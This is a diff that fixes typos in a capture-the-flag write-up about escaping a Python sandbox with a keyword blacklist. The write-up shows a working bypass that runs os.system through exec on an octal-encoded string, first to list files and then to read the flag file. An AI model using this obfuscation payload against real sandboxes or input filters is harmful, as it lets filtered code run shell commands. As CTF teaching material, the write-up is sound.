@@ -45,7 +45,7 @@ if __name__ == "__main__":
     server()
 ```
 
-It seems that the program will execute if it doesn't contains any string in `blacklist.txt`. So, let's take a look at `blacklist.txt`.
+It seems that the program will execute if it doesn't contain any string in `blacklist.txt`. So, let's take a look at `blacklist.txt`.
 
 #### blacklist.txt
 
@@ -75,19 +75,19 @@ int
 os
 ```
 
-Since the blacklist didn't contains "exec", so we could use it to our advantages. To make it difficult to read by python, we could use another way to interpret the character. For example we can try to use octal here so the python wouldn't detect it as the string they backlisted. (Reference: [bypass-python-sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)).
+Since the blacklist didn't contain "exec", we could use it to our advantage. To make it difficult to read by python, we could use another way to interpret the character. For example we can try to use octal here so the python wouldn't detect it as the string they backlisted. (Reference: [bypass-python-sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)).
 
 First we need to read or list what is inside the directory.
 ```python
 exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
 ```
-If we convert those octal number to string, it will turns into: `__import__('os').system('ls')`.
+If we convert those octal numbers to string, it will turn into: `__import__('os').system('ls')`.
 
 ![](iwanttobreakfree(ls).png)
 
 There is `cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt` inside the directory and I think that may be the flag.
 
-Convert our payload into ocal again and wrap it with exec(""). Now we use this payload to read the flag `"__import__('os').system('cat cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt')"`.
+Convert our payload into octal again and wrap it with exec(""). Now we use this payload to read the flag `"__import__('os').system('cat cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt')"`.
 
 Payload:
 ```python
